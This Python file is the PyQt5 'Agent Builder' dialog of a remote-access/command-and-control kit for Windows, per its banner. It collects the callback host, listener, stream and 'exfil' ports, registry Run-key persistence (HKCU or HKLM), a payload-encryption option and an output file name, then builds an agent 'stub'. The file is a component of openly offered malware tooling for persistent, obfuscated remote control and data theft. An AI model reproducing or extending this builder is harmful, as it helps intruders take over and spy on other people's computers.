#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.1
# -------------------------------------------------------------
from ..logging.logging import DNSconfigs,NetworkingConfigs
from ..builder.agent_builder import Builder
from ..utils.utils import ErrorHandling
from ..networking.IP_Handler import NicHandler
from ..Qt5.icons import IconObj

from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_builder_dialog(object):

    #Function will parse builder options from gui before calling create agent function
    def check_builder_options(self):
        reg_key = ''                #Set reg_key to empty string
        encryption_option = False   #Set encryption key to false

        if self.hkcu_radio.isChecked():                                     #If HKCU run key is checked
            reg_key = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'  #Return key
            perst_option = 'reg/run'                                        #Return registry key persistence option
        elif self.hklm_radio.isChecked():                                   #If HKLM is checked
            reg_key = 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'  #Return key#Return registry key
            perst_option = 'reg/run'                                        #Return registry key persistence option
        elif self.none_radio.isChecked():                                   #If no persistence option is selected
            reg_key = 'null'                                                #Set reg key to string null to avoid error
            perst_option = None                                             #Set perstistence option to none

        if self.encryption_radio.isChecked():                               #if the encryption radio is checked
            encryption_option = True                                        #Set encryption to true

        if reg_key == '':                                                   #If reg key is stil empty string,
            ErrorHandling().raise_error('Persistence option required.','','Build Failure') #Raise error
            return                                                           #Return back to calling function
        else:
            #If no error, parse host option and then create the agent
            host = NicHandler().validate_host(self.host_combobox.currentText()) #Validate the host
            Builder().create_agent(
                self.port_input.text(), self.stream_port_input.text(), self.exfil_port_input.text(),
                host, self.file_name_input.text(),reg_key,perst_option,encryption_option) #

    def setupUi(self, builder_dialog):
        builder_dialog.setObjectName("builder_dialog")
        builder_dialog.resize(460, 479)
        builder_dialog.setStyleSheet("background-color: rgb(0, 0, 0);")
        builder_dialog.setWindowIcon(IconObj().builder_icon)
        self.networking_group_box = QtWidgets.QGroupBox(builder_dialog)
        self.networking_group_box.setGeometry(QtCore.QRect(10, 10, 441, 101))
        font = QtGui.QFont()
        font.setFamily("Courier 10 Pitch")
        font.setPointSize(14)
        self.networking_group_box.setFont(font)
        self.networking_group_box.setStyleSheet("background-color: rgb(51, 51, 51);")
        self.networking_group_box.setAlignment(QtCore.Qt.AlignCenter)
        self.networking_group_box.setObjectName("networking_group_box")
        self.host_combobox = QtWidgets.QComboBox(self.networking_group_box)
        self.host_combobox.setGeometry(QtCore.QRect(80, 30, 351, 27))
        self.host_combobox.setObjectName("host_combobox")
        for domain in DNSconfigs().retrieve_dns_domains():              #for domains in the domains text file
            self.host_combobox.addItem(domain)                        #add domain to dropdown menu
        self.host_combobox.addItem('Local IP')
        self.host_combobox.addItem('Public IP')
        self.host_label = QtWidgets.QLabel(self.networking_group_box)
        self.host_label.setGeometry(QtCore.QRect(10, 30, 61, 21))
        font = QtGui.QFont()
        font.setPointSize(13)
        self.host_label.setFont(font)
        self.host_label.setObjectName("host_label")
        self.port_label = QtWidgets.QLabel(self.networking_group_box)
        self.port_label.setGeometry(QtCore.QRect(40, 60, 41, 19))
        font = QtGui.QFont()
        font.setPointSize(13)
        self.port_label.setFont(font)
        self.port_label.setObjectName("port_label")
        self.port_input = QtWidgets.QLineEdit(self.networking_group_box)
        self.port_input.setGeometry(QtCore.QRect(80, 60, 113, 31))
        self.port_input.setObjectName("port_input")
        self.obfuscation_groupbox = QtWidgets.QGroupBox(builder_dialog)
        self.obfuscation_groupbox.setGeometry(QtCore.QRect(10, 120, 441, 101))
        font = QtGui.QFont()
        font.setFamily("Courier 10 Pitch")
        font.setPointSize(14)
        self.obfuscation_groupbox.setFont(font)
        self.obfuscation_groupbox.setStyleSheet("background-color: rgb(51, 51, 51);")
        self.obfuscation_groupbox.setAlignment(QtCore.Qt.AlignCenter)
        self.obfuscation_groupbox.setObjectName("obfuscation_groupbox")
        self.encryption_radio = QtWidgets.QRadioButton(self.obfuscation_groupbox)
        self.encryption_radio.setGeometry(QtCore.QRect(10, 30, 141, 24))
        self.encryption_radio.setObjectName("encryption_radio")
        self.persistance_groupbox = QtWidgets.QGroupBox(builder_dialog)
        self.persistance_groupbox.setGeometry(QtCore.QRect(10, 230, 211, 111))
        font = QtGui.QFont()
        font.setFamily("Courier 10 Pitch")
        font.setPointSize(14)
        self.persistance_groupbox.setFont(font)
        self.persistance_groupbox.setStyleSheet("background-color: rgb(51, 51, 51);")
        self.persistance_groupbox.setAlignment(QtCore.Qt.AlignCenter)
        self.persistance_groupbox.setObjectName("compilation_groupbox")
        self.hkcu_radio = QtWidgets.QRadioButton(self.persistance_groupbox)
        self.hkcu_radio.setGeometry(QtCore.QRect(10, 30, 114, 24))
        self.hkcu_radio.setObjectName("raw_script_radio")
        self.hklm_radio = QtWidgets.QRadioButton(self.persistance_groupbox)
        self.hklm_radio.setGeometry(QtCore.QRect(10, 50, 114, 24))
        self.hklm_radio.setObjectName("pyinstaller_radio")
        self.none_radio = QtWidgets.QRadioButton(self.persistance_groupbox)
        self.none_radio.setGeometry(QtCore.QRect(10, 70, 114, 24))
        self.none_radio.setObjectName('none_radio')
        self.socket_groupbox = QtWidgets.QGroupBox(builder_dialog)
        self.socket_groupbox.setGeometry(QtCore.QRect(230, 230, 221, 111))
        font = QtGui.QFont()
        font.setFamily("Courier 10 Pitch")
        font.setPointSize(14)
        self.socket_groupbox.setFont(font)
        self.socket_groupbox.setStyleSheet("background-color: rgb(51, 51, 51);")
        self.socket_groupbox.setAlignment(QtCore.Qt.AlignCenter)
        self.socket_groupbox.setObjectName("socket_groupbox")
        self.exfil_port_input = QtWidgets.QLineEdit(self.socket_groupbox)
        self.exfil_port_input.setGeometry(QtCore.QRect(100, 30, 113, 33))
        self.exfil_port_input.setObjectName("exfil_port_input")
        self.exfil_port_input.setText(NetworkingConfigs().retrieve_exfil_port())
        self.stream_port_input = QtWidgets.QLineEdit(self.socket_groupbox)
        self.stream_port_input.setGeometry(QtCore.QRect(100, 70, 113, 33))
        self.stream_port_input.setObjectName("stream_port_input")
        self.stream_port_input.setText(NetworkingConfigs().retrieve_stream_port())
        self.label = QtWidgets.QLabel(self.socket_groupbox)
        self.label.setGeometry(QtCore.QRect(20, 40, 67, 19))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.socket_groupbox)
        self.label_2.setGeometry(QtCore.QRect(10, 70, 81, 20))
        self.label_2.setObjectName("label_2")
        self.file_settings_groupbox = QtWidgets.QGroupBox(builder_dialog)
        self.file_settings_groupbox.setGeometry(QtCore.QRect(10, 350, 441, 71))
        font = QtGui.QFont()
        font.setFamily("Courier 10 Pitch")
        font.setPointSize(14)
        self.file_settings_groupbox.setFont(font)
        self.file_settings_groupbox.setStyleSheet("background-color: rgb(51, 51, 51);")
        self.file_settings_groupbox.setAlignment(QtCore.Qt.AlignCenter)
        self.file_settings_groupbox.setObjectName("file_settings_groupbox")
        self.file_name_input = QtWidgets.QLineEdit(self.file_settings_groupbox)
        self.file_name_input.setGeometry(QtCore.QRect(110, 30, 321, 33))
        self.file_name_input.setObjectName("file_name_input")
        self.file_name_label = QtWidgets.QLabel(self.file_settings_groupbox)
        self.file_name_label.setGeometry(QtCore.QRect(10, 40, 81, 21))
        font = QtGui.QFont()
        font.setPointSize(12)
        self.file_name_label.setFont(font)
        self.file_name_label.setObjectName("file_name_label")
        self.build_stub_button = QtWidgets.QPushButton(builder_dialog,clicked=lambda: self.check_builder_options())
        self.build_stub_button.setGeometry(QtCore.QRect(10, 430, 441, 41))
        font = QtGui.QFont()
        font.setFamily("Courier 10 Pitch")
        font.setPointSize(15)
        self.build_stub_button.setFont(font)
        self.build_stub_button.setObjectName("build_stub_button")

        self.retranslateUi(builder_dialog)
        QtCore.QMetaObject.connectSlotsByName(builder_dialog)

    def retranslateUi(self, builder_dialog):
        _translate = QtCore.QCoreApplication.translate
        builder_dialog.setWindowTitle(_translate("builder_dialog", "Agent Builder"))
        self.networking_group_box.setTitle(_translate("builder_dialog", "Networking Settings"))
        self.host_label.setText(_translate("builder_dialog", "       Host"))
        self.port_label.setText(_translate("builder_dialog", "Port"))
        self.obfuscation_groupbox.setTitle(_translate("builder_dialog", "Obfuscation"))
        self.encryption_radio.setText(_translate("builder_dialog", "Encrypt Payload"))
        self.persistance_groupbox.setTitle(_translate("builder_dialog", "Persistence"))
        self.hkcu_radio.setText(_translate("builder_dialog", "HKCU\\Run"))
        self.hklm_radio.setText(_translate("builder_dialog", "HKLM\\Run"))
        self.none_radio.setText(_translate("builder_dialog", "None"))
        self.socket_groupbox.setTitle(_translate("builder_dialog", "Socket Settings"))
        self.label.setText(_translate("builder_dialog", "Exfil Port"))
        self.label_2.setText(_translate("builder_dialog", "Stream Port"))
        self.file_settings_groupbox.setTitle(_translate("builder_dialog", "File Settings"))
        self.file_name_label.setText(_translate("builder_dialog", "File Name"))
        self.build_stub_button.setText(_translate("builder_dialog", "Build Stub"))

